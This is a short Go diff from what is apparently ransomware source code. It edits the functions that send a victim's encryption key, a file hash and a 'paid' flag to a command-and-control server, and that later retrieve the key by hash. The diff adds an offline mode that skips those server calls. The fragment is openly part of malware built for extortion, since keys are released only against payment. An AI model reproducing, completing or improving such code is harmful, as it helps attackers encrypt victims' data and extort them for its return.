@@ -40,7 +40,10 @@ func GetDesktopLocation() string {
 	return filepath.Join(home, "Desktop")
 }
 
-func SendOffKey(hexKey string, hash string, paid bool) (bool, error) {
+func SendOffKey(hexKey string, hash string, paid bool, OfflineMode bool) (bool, error) {
+	if OfflineMode {
+		return false, errors.New("failed to contact CnC server")
+	}
 	jsonBody, err := json.Marshal(KeySendoffStruct{
 		Key:  hexKey,
 		Hash: hash,
@@ -59,7 +62,10 @@ func SendOffKey(hexKey string, hash string, paid bool) (bool, error) {
 	return resp.StatusCode == 200, err
 }
 
-func RetriveKeyByHash(hash string) (string, error) {
+func RetriveKeyByHash(hash string, OfflineMode bool) (string, error) {
+	if OfflineMode {
+		return "", errors.New("failed to contact CnC server")
+	}
 	resp, err := http.Get(host + "v2/" + hash)
 	if err != nil || resp.StatusCode != 200 {
 		return "", errors.New("failed to contact CnC server")
